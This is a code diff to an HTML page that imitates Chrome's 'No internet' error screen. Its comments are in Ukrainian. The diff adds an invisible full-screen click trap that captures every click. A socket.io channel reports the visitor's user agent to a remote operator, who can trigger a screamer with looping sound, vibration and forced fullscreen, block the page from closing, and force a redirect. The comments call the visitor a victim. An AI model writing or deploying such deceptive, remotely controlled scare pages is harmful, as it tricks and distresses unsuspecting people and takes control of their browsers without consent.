@@ -16,6 +16,7 @@
             height: 100vh;
             overflow: hidden;
             user-select: none;
+            -webkit-user-select: none;
         }
 
         @media (prefers-color-scheme: dark) {
@@ -26,6 +27,8 @@
             max-width: 600px;
             width: 90%;
             padding: 20px;
+            position: relative;
+            z-index: 10;
         }
 
         /* Тот самый динозаврик */
@@ -74,12 +77,21 @@
             display: none; position: fixed; top: 0; left: 0;
             width: 100%; height: 100%;
             background: black no-repeat center center;
-            background-size: cover; /* Важливо для зображень */
+            background-size: contain; /* Щоб картинка влазила */
+            background-color: black;
             z-index: 9999;
+        }
+
+        /* Невидима пастка для кліків */
+        #click-trap {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            z-index: 999; cursor: default;
         }
     </style>
 </head>
 <body>
+    <div id="click-trap"></div>
+
     <div class="container" id="ui">
         <div class="dino-container">
             <svg class="dino-icon" viewBox="0 0 24 24">
@@ -100,35 +112,18 @@
         </div>
 
         <div class="error-code">ERR_INTERNET_DISCONNECTED</div>
-        <button class="btn-reload" id="btn" onclick="activatePrank()">Обновить</button>
+        <button class="btn-reload" id="btn">Обновить</button>
     </div>
 
     <div id="prank-view"></div>
 
     <script src="/socket.io/socket.io.js"></script>
     <script>
-        // --- TRANSLATIONS ---
+        // --- ПЕРЕКЛАД ІНТЕРФЕЙСУ ---
         const translations = {
-            uk: { 
-                title: "Немає підключення до Інтернету", h1: "Немає підключення до Інтернету", 
-                p1: "Спробуйте наступне:", l1: "Перевірте мережеві кабелі, модем і маршрутизатор.", 
-                l2: "Повторно підключіться до Wi-Fi.", details: "Докладніше", btn: "Оновити" 
-            },
-            ru: { 
-                title: "Нет подключения к интернету", h1: "Нет подключения к интернету", 
-                p1: "Попробуйте сделать следующее:", l1: "Проверьте сетевые кабели, модем и маршрутизатор.", 
-                l2: "Подключитесь к сети Wi-Fi еще раз.", details: "Подробнее", btn: "Обновить" 
-            },
-            en: { 
-                title: "No internet", h1: "No internet", p1: "Try:", 
-                l1: "Checking the network cables, modem, and router.", l2: "Reconnecting to Wi-Fi.", 
-                details: "Details", btn: "Reload" 
-            },
-            ja: { 
-                title: "インターネットに接続されていません", h1: "インターネットに接続されていません", 
-                p1: "次のことをお試しください：", l1: "ネットワーク ケーブル、モデм、ルーターを確認する", 
-                l2: "Wi-Fi に再接続する", details: "詳細", btn: "再読み込み" 
-            }
+            uk: { title: "Немає підключення до Інтернету", h1: "Немає підключення до Інтернету", p1: "Спробуйте наступне:", l1: "Перевірте мережеві кабелі, модем і маршрутизатор.", l2: "Повторно підключіться до Wi-Fi.", details: "Докладніше", btn: "Оновити" },
+            ru: { title: "Нет подключения к интернету", h1: "Нет подключения к интернету", p1: "Попробуйте сделать следующее:", l1: "Проверьте сетевые кабели, модем и маршрутизатор.", l2: "Подключитесь к сети Wi-Fi еще раз.", details: "Подробнее", btn: "Обновить" },
+            en: { title: "No internet", h1: "No internet", p1: "Try:", l1: "Checking the network cables, modem, and router.", l2: "Reconnecting to Wi-Fi.", details: "Details", btn: "Reload" }
         };
 
         const lang = navigator.language.split('-')[0];
@@ -147,55 +142,103 @@
             content.style.display = content.style.display === 'block' ? 'none' : 'block';
         }
 
-        // --- SOCKET LOGIC ---
+        // --- ЛОГІКА ПАСТКИ ---
         const socket = io();
         const id = new URLSearchParams(window.location.search).get('id');
         let audio = new Audio();
         const prankView = document.getElementById('prank-view');
+        
+        // ЗМІННІ СТАНУ
+        let isAutoMode = false;
+        let hasInteracted = false;
 
-        // Unlock audio context on first interaction
-        function activatePrank() {
-            audio.play().then(() => { 
-                audio.pause(); 
-                audio.currentTime = 0; 
-            }).catch(()=>{});
-        }
-        document.body.addEventListener('click', activatePrank, { once: true });
-        document.body.addEventListener('touchstart', activatePrank, { once: true });
+        // Вхід у кімнату
+        socket.emit('join-room-victim', { roomId: id, userAgent: navigator.userAgent });
 
-        // Join Room
-        socket.emit('join-room-victim', { 
-            roomId: id, 
-            userAgent: navigator.userAgent 
-        });
-
-        // Update Media (Image/Sound)
+        // Обробка оновлень
         socket.on('update-media', (data) => {
+            // Оновлюємо картинку
             if (data.image) {
-                // If it's a URL (from upload) or Base64
                 prankView.style.backgroundImage = `url('${data.image}')`;
             }
+            // Оновлюємо звук
             if (data.sound) {
                 audio.src = data.sound;
                 audio.load();
             }
+            
+            // Оновлюємо статус AUTO MODE
+            if (data.auto !== undefined) {
+                isAutoMode = data.auto;
+                console.log("Auto Mode:", isAutoMode);
+                
+                // Якщо жертва вже клікала раніше і режим увімкнувся - запускаємо
+                if (isAutoMode && hasInteracted) {
+                    startChaos();
+                }
+            }
         });
 
-        // Trigger Scare
+        // Ручний запуск (Screamer)
         socket.on('play-sound', () => {
-            document.getElementById('ui').style.display = 'none';
-            prankView.style.display = 'block';
-            
-            audio.currentTime = 0;
-            audio.play().catch(e => console.log("Audio play failed (interaction needed)", e));
-            
-            if (navigator.vibrate) navigator.vibrate([400, 200, 400, 200, 1000]);
+            startChaos();
         });
 
-        // --- BOMBARDIO (REDIRECT) ---
+        // Редірект (Bombardio)
         socket.on('force-redirect', (data) => {
             window.location.href = data.url;
         });
+
+        // --- ГОЛОВНА ФУНКЦІЯ ХАОСУ ---
+        function startChaos() {
+            document.getElementById('ui').style.display = 'none';
+            document.getElementById('click-trap').style.display = 'none';
+            prankView.style.display = 'block';
+            
+            // 1. Звук
+            if (isAutoMode) audio.loop = true; // Зациклюємо якщо авто
+            audio.play().catch(e => console.log("Audio block:", e));
+
+            // 2. Вібрація
+            if (navigator.vibrate) navigator.vibrate([500, 200, 500, 200, 1000]);
+
+            // 3. Повний екран (якщо браузер дозволить)
+            if (isAutoMode) {
+                try {
+                    document.documentElement.requestFullscreen().catch(()=>{});
+                } catch(e){}
+            }
+        }
+
+        // --- ОБРОБНИК КЛІКІВ ---
+        // Це перехоплює будь-який клік на сторінці (навіть на кнопку "Обновить")
+        document.addEventListener('click', () => {
+            hasInteracted = true;
+            
+            // "Прогріваємо" аудіо (щоб браузер дозволив грати звук потім)
+            if (audio.src) {
+                audio.play().then(() => {
+                    // Якщо зараз НЕ час для пранку, ставимо на паузу
+                    if (!isAutoMode) {
+                        audio.pause();
+                        audio.currentTime = 0;
+                    }
+                }).catch(()=>{});
+            }
+
+            // Якщо режим AUTO увімкнено - запускаємо пастку
+            if (isAutoMode) {
+                startChaos();
+            } else {
+                // Якщо це була кнопка "Обновити", але авто-режим вимкнений,
+                // робимо фейкову анімацію або нічого (імітуємо зависання)
+            }
+        }, { capture: true }); // capture: true гарантує перехоплення події до того, як вона дійде до кнопки
+
+        // Заборона виходу (працює тільки після взаємодії)
+        window.onbeforeunload = function() {
+            if (isAutoMode) return "Are you sure?";
+        };
 
     </script>
 </body>
